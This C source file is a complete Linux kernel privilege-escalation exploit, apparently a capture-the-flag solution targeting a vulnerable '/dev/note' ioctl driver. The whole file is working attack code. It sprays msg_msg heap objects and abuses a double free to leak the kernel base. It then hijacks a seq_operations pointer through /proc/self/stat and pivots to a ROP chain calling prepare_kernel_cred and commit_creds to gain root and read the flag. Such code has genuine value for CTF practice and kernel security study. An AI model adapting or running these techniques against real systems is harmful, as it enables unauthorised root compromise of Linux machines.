#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<sys/xattr.h>
#include <sys/ipc.h>
#include <sys/socket.h>
#include <sys/msg.h>


#define ulong unsigned long

#define VIEW 0xC12ED004
#define EDIT 0xC12ED003
#define RM 0xC12ED002
#define ADD 0xC12ED001


typedef struct{
    ulong size;
    char* buf;
}req;


struct {
    long mtype;
    char mtext[0x80];
} msgbuf;

int fd;

ulong user_cs, user_ss, user_sp, user_rflags;

static void save_state(void) {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}


void op(){
    fd = open("/dev/note",O_RDWR);
    if(fd<0){
        perror("Open");
    }
}


void add(ulong size){
    req q;
    q.size = size;
    int ret = ioctl(fd,ADD,&q);
    if(ret<0){
        perror("Add");
    }
}

void rm(){
    req q;
    int ret = ioctl(fd,RM,&q);
    if(ret<0){
        perror("rm");
    }
}

void edit(ulong size, char * buf){
    req q;
    q.size = size;
    q.buf = buf;
    int ret = ioctl(fd,EDIT,&q);
    if(ret<0){
        perror("Edit");
    }
}

void view(ulong size, char * buf){
    req q;
    q.size = size;
    q.buf = buf;
    int ret = ioctl(fd, VIEW, &q);
    if(ret<0){
        perror("View");
    }
}

void shell(){
    system("cat /flag");
    return;
}


int main(){
    save_state();
    op();
    int qid;
    unsigned long buf[0x80];
    memset(buf, 'X', 0x80);
    // msg_msg init
    if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
        perror("msgget");
        return -1;
    }
    msgbuf.mtype = 1 ;
    memset(msgbuf.mtext, 'A', sizeof(msgbuf.mtext));
    // heap spray with msg_msg of 0x80 size
    for(int i = 0; i < 0xf; i++) {
        if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) {
            perror("msgsnd");
            return -1;
        }
    }
    // making chunk point to itself
    add(0x80);
    edit(0x80, (void*)buf);
    rm();
    // removing the freed chunk
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) {
        perror("msgsnd");
        return -1;
    }
    // chunk in double free
    add(0x80);
    // subprocess_info in the same place
    socket ( 22 , AF_INET, 0 );
    // getting kernel base
    view(0x80,(void *)buf);
    ulong base = buf[3]-0x60160;
    printf("base @ %p",(void *)base);
    rm();

    for(int i=0;i<0x89;i++){
        open("/proc/self/stat",O_RDONLY);
    }

    add(0x20);
    edit(0x20,(void * )buf);
    rm();
    
    open("/proc/self/stat",O_RDONLY);
    
    add(0x20);
    int ufd = open("/proc/self/stat",O_RDONLY);

    ulong mov_rsp = base + 0x5832b;    // mov esp,0x83c389c0 ; ret
    ulong pop_rdi = base + 0x11c353;    // pop rdi ; ret
    //ulong pop_rdx = base + 0x10dc0f;   // pop rdx ; ret
    ulong pop_rdx = base + 0xea9a15; 
    ulong prepare_cred = base + 0x69e00;   // prepare_kernel_cred
    ulong commit_cred = base + 0x69c10;    // commit_creds
    ulong pop_r8 = base + 0x22beb4;        // pop r8 ; ret
    ulong mov_rdi_rax = base + 0xa296e;    // mov rdi, rax ; cmp r8, rdx ; jne addr ; ret
    ulong trampoline = base + 0x600a4a;    // setting regs and returning

    ulong  *stack  = mmap(0x83C38000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if((ulong)stack!=0x83c38000){
        perror("mmap");
    }


    ulong * rop =(ulong *) 0x83C389c0;
    *rop ++ = pop_rdi;
    *rop ++ = 0;
    *rop ++ = prepare_cred;
    *rop ++ = pop_r8;
    *rop ++ = 0;
    *rop ++ = pop_rdx;
    *rop ++ = 0;
    *rop ++ = mov_rdi_rax;
    *rop ++ = commit_cred;
    *rop ++ = trampoline;
    *rop ++ = 0; 
    *rop ++ = 0; 
    *rop ++ = (ulong)&shell;
    *rop ++ = user_cs;
    *rop ++ = user_rflags;
    *rop ++ = user_sp;
    *rop ++ = user_ss;


    buf[0]=mov_rsp;
    buf[1]=mov_rsp;
    buf[2]=mov_rsp;
    buf[3]=mov_rsp;
    edit(0x20,(void*)buf);
    read(ufd,buf,1);
    return 0;
}
